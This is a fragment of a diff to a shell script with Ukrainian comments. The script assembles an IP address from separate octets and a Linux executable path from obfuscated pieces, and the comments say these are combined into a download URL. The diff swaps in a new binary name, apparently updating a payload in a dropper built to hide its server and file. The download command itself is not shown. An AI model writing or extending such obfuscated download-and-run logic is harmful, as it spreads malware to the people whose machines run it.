@@ -13,7 +13,7 @@ if [ "$3" = "1" ]; then
     IP="${A}.${B}.${C}.${D}"
 
     # Шлях до бінарника (теж обфускований)
-    PART1="exe_linux_bfb23bfb"
+    PART1="exe_linux_334a616a"
     PART2="randomnayahuinya43438f483f3sfsdf34"
     
     # Збираємо URL
